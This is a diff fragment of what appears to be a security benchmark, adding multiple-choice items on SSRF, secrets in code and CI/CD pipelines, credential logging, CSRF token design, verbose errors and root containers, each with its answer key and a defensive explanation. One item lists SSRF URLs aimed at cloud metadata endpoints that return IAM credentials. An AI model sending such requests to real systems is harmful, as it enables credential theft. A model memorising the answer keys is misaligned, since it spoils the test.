+    "explanation": "Secrets in source code (or .gitignored config files) are dangerous because: (1) Git history preserves them even after removal; (2) Developers clone repos to laptops, creating additional copies; (3) Build artifacts may contain secrets; (4) Repository access control changes over time. Proper secrets management: (1) Secrets managers provide API-based secret retrieval with IAM identity authentication; (2) Secrets never touch disk or source code; (3) Automatic rotation supported; (4) Audit trail for all secret access; (5) Fine-grained access control. Encrypted secrets in repos have the same problem — the encryption key must be stored somewhere accessible, typically another secret. The root fix is secrets managers, not better hiding of secrets.",
+    "weakness": "Secrets management, hardcoded credentials, secrets managers",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Secrets_Management_Cheat_Sheet.html", "https://csrc.nist.gov/pubs/sp/800/57/pt1/r5/final"]
+  },
+  {
+    "id": 8020,
+    "domain": 8,
+    "text": "A developer implements an API endpoint that accepts a callback URL from the user and makes an HTTP request to it to notify the user of a completed job. The validation only checks that the URL starts with 'https://'. A security review flags a Server-Side Request Forgery (SSRF) vulnerability. What specific internal resources could an attacker access?",
+    "options": [
+      "SSRF is only a concern in cloud environments — on-premises deployments are not vulnerable",
+      "With callback URL SSRF, an attacker can: (1) Access cloud metadata APIs — https://169.254.169.254/latest/meta-data/ (AWS) or https://metadata.google.internal/ for IAM credentials; (2) Reach internal services not exposed externally — internal admin panels, internal APIs, internal databases with HTTP interfaces; (3) Port scan internal network to discover services; (4) Read internal files via file:// protocol if the HTTP library supports it; (5) Bypass firewall rules that block external access but allow outbound from application servers; the 'https://' prefix check only validates scheme, not destination — 'https://169.254.169.254/' passes the check",
+      "SSRF via callback URLs is limited to reading the response — it cannot reach internal services",
+      "The 'https://' validation prevents SSRF — HTTP would be the vulnerable scheme"
+    ],
+    "answer": 1,
+    "explanation": "SSRF (Server-Side Request Forgery) is critical in cloud environments. The server makes HTTP requests on behalf of user-supplied URLs. 'https://' prefix check bypasses: (1) https://169.254.169.254/ — AWS IMDS (IAM credentials); (2) https://metadata.google.internal/computeMetadata/v1/ — GCP metadata; (3) https://169.254.169.254/latest/user-data/ — EC2 user data (may contain secrets); (4) https://internal-admin.corp/ — internal admin panels. Mitigations: (1) Allowlist specific domains; (2) Block RFC 1918 addresses (10.x, 172.16.x, 192.168.x) and link-local (169.254.x) at the application layer; (3) Use DNS resolution validation to prevent DNS rebinding; (4) Run callback requester in isolated network environment with no internal access.",
+    "weakness": "SSRF, cloud metadata, callback URL security",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8021,
+    "domain": 8,
+    "text": "A software team implements logging for their application. A developer adds the following log line for debugging: logger.info('User login: ' + username + ' password: ' + password). A security reviewer demands immediate removal. What risks does logging credentials create?",
+    "options": [
+      "The log line is acceptable for development — remove before production deployment",
+      "Logging credentials creates permanent security exposure: (1) Application logs are frequently sent to SIEM/log aggregation systems where many administrators have access; (2) Log files are often included in debugging bundles sent to vendors; (3) Log files may be backed up without the same encryption as the production database; (4) SIEM administrators can search logs for 'password' and retrieve all users' passwords; (5) Log aggregation systems (Splunk, ELK) may have weaker access controls than the application database; additionally, this likely violates PCI DSS Requirement 3.4, GDPR, HIPAA minimum necessary; fix: never log credentials, tokens, or sensitive data; log 'user login attempt' with username only",
+      "Only remove the password from the log — logging the username with authentication events is required for audit trails",
+      "Encrypt the log line — encrypted credential logs are acceptable since they cannot be read without the key"
+    ],
+    "answer": 1,
+    "explanation": "Sensitive data in logs creates high-risk exposure: (1) Logs are widely accessible — developers, operations, security teams, third-party SIEM vendors; (2) Log retention: credentials logged today may be readable for years in cold storage; (3) Log forwarding: application logs sent to external services (Datadog, Splunk Cloud) now expose credentials to third parties; (4) PCI DSS Requirement 3.4 prohibits storing cardholder data in logs; (5) OWASP Logging Cheat Sheet explicitly prohibits authentication credentials in logs. Secure logging: authentication events should log who, when, success/failure — never the credential itself. This applies to passwords, API keys, tokens, session identifiers, and credit card numbers.",
+    "weakness": "Sensitive data in logs, secure logging practices, credential exposure",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Logging_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8022,
+    "domain": 8,
+    "text": "A web application implements CSRF protection using a synchronizer token pattern. The CSRF token is a user's session ID appended with the current timestamp and hashed with MD5. A security review finds this inadequate. What improvements are required?",
+    "options": [
+      "The implementation is adequate — MD5 of session ID + timestamp provides sufficient unpredictability",
+      "Multiple weaknesses: (1) MD5 is cryptographically broken — collisions are achievable; (2) Session ID as input to token generation creates correlation — if session ID is compromised, CSRF tokens can be calculated; (3) Timestamp reduces the token entropy — an attacker with approximate knowledge of when the user visited can narrow the search space; (4) The token should be a cryptographically random value independent of session ID, generated by a CSPRNG, stored server-side associated with the session, and verified on each state-changing request — HMAC-SHA256 of a random value with a server secret is the recommended approach per OWASP",
+      "Add a salt to the MD5 hash — a random salt prevents precomputation attacks",
+      "The main issue is using session ID as input — use username instead, which is not sensitive information"
+    ],
+    "answer": 1,
+    "explanation": "CSRF token requirements (OWASP Cheat Sheet): (1) Cryptographically random — generated by CSPRNG with at least 128 bits of entropy; (2) Unique per user session (ideally per-request for sensitive operations); (3) Stored server-side and compared on each state-changing request; (4) Not derivable from any known user attributes; (5) Not transmitted in URLs (log exposure, Referer header exposure). The reviewed implementation fails: MD5 is broken (weak), session ID derivation creates correlation, timestamp reduces entropy. HMAC-SHA256 with server secret is the implementation approach: token = HMAC-SHA256(server_secret, session_id + random_nonce), verified server-side. Or simply: generate 32 bytes from CSPRNG, store in session, compare on submission.",
+    "weakness": "CSRF protection, token generation, CSPRNG requirements",
+    "references": ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"]
+  },
+  {
+    "id": 8023,
+    "domain": 8,
+    "text": "A DevOps team has automated deployment of application updates using a CI/CD pipeline. The pipeline script contains hardcoded AWS credentials with admin access used to deploy to production. A security review identifies this as critical. Why is this a critical finding beyond the secret exposure risk?",
+    "options": [
+      "The finding is moderate — CI/CD credentials are intended for automation and admin access is typical for deployment",
+      "This is critical for multiple compounding reasons: (1) CI/CD systems (GitHub Actions, Jenkins, GitLab CI) are frequently targeted by attackers — a single pipeline compromise provides persistent admin AWS access; (2) Hardcoded credentials in pipeline scripts may be visible to all developers with repository access; (3) Admin access in CI/CD violates least privilege — deployment typically requires specific S3 write, ECS update, or Lambda deploy permissions, not full admin; (4) CI/CD pipelines should use ephemeral OIDC-based credentials (GitHub Actions OIDC → AWS IAM Role) that last only for the duration of the pipeline run, requiring no stored secrets at all",
+      "The issue is only the admin access level — rotate credentials and reduce permissions to resolve the finding",
+      "CI/CD hardcoded credentials are an accepted practice — secrets managers cannot integrate with all CI/CD platforms"
+    ],
+    "answer": 1,
+    "explanation": "CI/CD credential security is a major supply chain risk: (1) Pipeline compromise = persistent production access (SolarWinds attack vector); (2) Developer visibility: repository secrets are visible to all team members with access; (3) Principle of least privilege: deployment tasks require specific minimal permissions, not admin; (4) Modern solution: OIDC federation — GitHub Actions/GitLab CI can authenticate directly to AWS IAM without any stored credentials using short-lived tokens issued per pipeline run; no static credentials to steal or rotate. AWS supports OIDC from all major CI/CD platforms. This eliminates the credential management problem entirely. Also: separate AWS accounts for production vs staging prevents accidental production impact.",
+    "weakness": "CI/CD security, OIDC federation, pipeline credential management",
+    "references": ["https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services", "https://www.nist.gov/pubs/sp/800/218/final"]
+  },
+  {
+    "id": 8024,
+    "domain": 8,
+    "text": "A security engineer discovers that a production web application is running in debug mode with detailed stack traces returned in error responses. A user sent a request that triggered an exception, and the response included: database connection string, internal IP addresses, file paths, and library versions. Why is this a significant security finding?",
+    "options": [
+      "This is a low-severity finding — stack traces only help developers debug and don't assist attackers",
+      "Detailed error messages and debug output provide critical reconnaissance to attackers: (1) Database connection strings reveal connection details, credentials, and database type enabling direct attack; (2) Internal IP addresses map the internal network topology; (3) File paths reveal application structure, OS type, and potential path traversal targets; (4) Library versions enable precise vulnerability selection (attacker looks up known CVEs for exposed versions); this information dramatically reduces attacker effort from weeks to hours; fix: custom error pages in production returning only user-friendly messages with error reference IDs; detailed errors only in development environments with no external exposure",
+      "The finding only matters if the error can be reproduced by attackers — disable debug mode and the risk is eliminated",
+      "Stack traces are acceptable in staging environments — ensure this error only occurs during testing"
+    ],
+    "answer": 1,
+    "explanation": "Verbose error messages (OWASP A05:2021 — Security Misconfiguration) are significant reconnaissance enablers: (1) Database connection strings in errors: complete credentials, host, database name — enables direct database access; (2) Library versions: precise CVE lookup and exploit selection; (3) File paths: OS identification (C:\\ vs /var/www/), directory structure for path traversal; (4) Internal IPs: network reconnaissance, pivot target identification. These collectively provide an attacker with a blueprint of the application architecture. Production systems must always show generic error pages (with error reference IDs for support correlation). Error details logged server-side only, never in HTTP responses.",
+    "weakness": "Verbose error messages, information disclosure, debug mode in production",
+    "references": ["https://owasp.org/www-project-top-ten/"]
+  },
+  {
+    "id": 8025,
+    "domain": 8,
+    "text": "A development team uses containerized applications (Docker) deployed in Kubernetes. A security review identifies that all containers run as root (UID 0). The operations team argues 'it's just a container — if the container is compromised, the attacker is still isolated.' Is this argument correct?",
+    "options": [
+      "The operations team is correct — container isolation ensures that root inside a container is unprivileged outside",
+      "The argument is partially incorrect and dangerously incomplete: (1) Container escape vulnerabilities exist — container root can escape to the host system if kernel vulnerabilities exist (CVE-2019-5736 runc, CVE-2020-15257 containerd); (2) Running as root inside a container uses the host kernel's root UID — privileges are partially shared; (3) Volume mounts, privileged containers, and hostPath volumes grant direct host access; (4) Even without escape, root inside the container can read/write any container filesystem, execute arbitrary code, and modify container environment; use non-root container users: USER 1000 in Dockerfile, Pod Security Standards (Restricted), securityContext.runAsNonRoot: true",
+      "The operations team is correct for Kubernetes-managed containers — Kubernetes adds an additional isolation layer preventing container-host privilege escalation",
+      "Root in containers is only a risk if the container runs with --privileged flag — standard containers are safe"
+    ],
+    "answer": 1,
+    "explanation": "Container security principle: containers are not VMs and do not provide equivalent isolation. Root inside a container: (1) Container escape: kernel vulnerabilities (runc, containerd CVEs) allow root inside container to escape to host as root; (2) Privileged containers (--privileged) have full host access — root in privileged container = root on host; (3) Volume mounts: root can read/write mounted host paths; (4) Host namespace sharing (--pid, --network, --ipc) grants host-level access. Defense: non-root user in Dockerfile (USER 1000), Pod Security Standards Restricted profile in Kubernetes, read-only root filesystem, seccomp profiles (blocking dangerous syscalls), AppArmor/SELinux profiles, drop capabilities (ALL, add only needed ones).",
+    "weakness": "Container security, root in containers, privilege escalation",
+    "references": ["https://csrc.nist.gov/pubs/sp/800/190/final", "https://kubernetes.io/docs/concepts/security/pod-security-standards/"]
+  }
+]
